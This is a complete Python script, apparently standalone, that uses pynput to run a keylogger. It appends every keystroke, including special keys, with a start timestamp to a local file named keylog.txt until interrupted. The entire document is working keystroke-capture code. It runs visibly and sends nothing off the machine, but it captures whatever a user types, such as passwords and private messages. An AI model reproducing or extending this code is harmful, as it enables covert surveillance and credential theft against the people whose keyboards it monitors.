from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

print("Keylogger started. Press CTRL+C to stop.")

with open(log_file, "a") as f:
    f.write(f"\n--- Logging started {datetime.now()} ---\n")

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nKeylogger stopped cleanly.")

